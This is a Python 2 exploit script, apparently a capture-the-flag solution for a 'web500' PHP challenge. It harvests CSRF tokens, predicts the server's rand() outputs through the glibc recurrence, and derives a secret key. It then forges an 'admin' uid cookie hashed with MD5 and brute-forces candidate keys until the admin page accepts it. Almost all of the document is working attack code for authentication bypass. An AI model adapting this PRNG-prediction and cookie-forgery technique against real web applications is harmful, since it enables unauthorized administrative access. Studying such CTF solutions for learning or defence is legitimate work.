#!/usr/bin/env python
#coding:utf--8 


import requests
import re
import itertools
import random
import string
import hmac
import hashlib
import sys

rand = 'qwertyuiopasdfghjklzxcvbnm0123456789QWERTYUIOPASDFGHJKLZXCVBNM'
get_token = "http://wonderkun.cc/web500/index.php?action=admin&mode=login"
test_cookie="http://wonderkun.cc/web500/index.php?action=admin&mode=index"


def get_csrf_token(res):
    rex = re.search(r'\S*<input type="hidden" name="TOKEN" id="password" value="(\w*)">', res.content)
    return rex.group(1)


def str_to_random(lst):
    return [rand.find(s) for s in lst]

def random_to_str(lst):
    return ''.join([rand[i] if 0 <= i < len(rand) else '0' for i in lst])

def calc_key(lst):
    for i in range(len(lst), len(lst) + 6):
        assert(lst[i - 31] != -1)
        assert(lst[i - 3] != -1)
        lst.append((lst[i - 31] + lst[i - 3]) % len(rand))
    return lst[-6:]

def test_token(s,screat,phpsessionid):

    # _cookie=s.cookies
    # requests.utils.add_dict_to_cookiejar(_cookie,{"uid":"admin%7c"+hash_hmac(screat)})

    s.headers['cookie']=""
    s.headers['Cookie']="uid=admin%7c"+hash_hmac(screat)+"; "+phpsessionid
    

    res=s.get(test_cookie)
    if res.content.find("not login")<0:
        print "key",screat
        print "cookies",s.headers['Cookie']
        
        return True
    else:
        print "key:",screat,"failed!"
        return False


def hash_hmac(data):
    hash=hashlib.md5()
    hash.update(data+"admin")
    # h = hmac.new(key, data, hashlib.md5)
    return hash.hexdigest()

def rand_str(length):
    return ''.join(random.choice(string.letters + string.digits) for _ in range(length))

def calc_maybe(lst):
    prd = []
    for i in lst:
        prd.append((i, i+1))
    return itertools.product(*prd)


rand_lst = []
s = requests.session();
s.headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51"
                  ".0.2704.63 Safari/537.36"
}

for i in range(2):
    s.headers['Cookie'] = "PHPSESSID={};".format(rand_str(12))
    res = s.get(get_token)
    token = get_csrf_token(res)
    rand_lst += list("\x00" * 6)
    rand_lst += list(token)

#print(rand_lst)
rand_lst = str_to_random(rand_lst)

print rand_lst

key_arr = calc_key(rand_lst)
print("[calc key] ", key_arr)

#第三次发送请求,并保存session
s.headers['Cookie'] = "PHPSESSID={};".format(rand_str(26))
phpsessionid=s.headers['Cookie']

for fkey in calc_maybe(key_arr):
    if test_token(s, random_to_str(fkey),phpsessionid):
        break 

